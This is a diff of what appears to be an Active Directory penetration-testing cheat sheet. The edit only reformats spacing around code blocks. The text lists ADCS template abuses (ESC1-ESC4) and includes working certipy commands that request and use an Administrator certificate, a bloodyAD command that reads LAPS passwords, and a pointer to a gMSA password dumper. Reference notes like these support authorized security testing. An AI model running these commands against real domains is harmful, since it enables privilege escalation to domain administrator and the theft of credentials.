@@ -138,10 +138,12 @@ certipy find -u user@domain.tld -p pass -dc-ip 10.0.0.1 -vulnerable -stdout
 Most common wins:
 
 - **ESC1** — template allows SAN specified + client-auth EKU + low-priv enrollment. Request cert as "Administrator".
+
   ```
   certipy req -u user@domain.tld -p pass -ca CA -template VulnTemplate -upn administrator@domain.tld
   certipy auth -pfx administrator.pfx
   ```
+
 - **ESC2** — template with "Any Purpose" or no EKU → impersonate via cert.
 - **ESC3** — Enrollment Agent template → request on-behalf-of any user.
 - **ESC4** — misconfigured template ACL → edit template to ESC1 state.
@@ -171,9 +173,11 @@ Typical wins:
 ## LAPS / gMSA
 
 - LAPS — if reader group leaked or ACL includes non-admins, read `ms-Mcs-AdmPwd` / `msLAPS-Password` directly via LDAP.
+
   ```
   bloodyAD -u user -p pass -d domain.tld --host dc01 get object TARGETHOST --attr msLAPS-Password
   ```
+
 - gMSA — retrieve `msDS-ManagedPassword` (if reader): `impacket-gMSADumper` — https://github.com/micahvandeusen/gMSADumper.
 
 ## DC vulnerabilities to verify
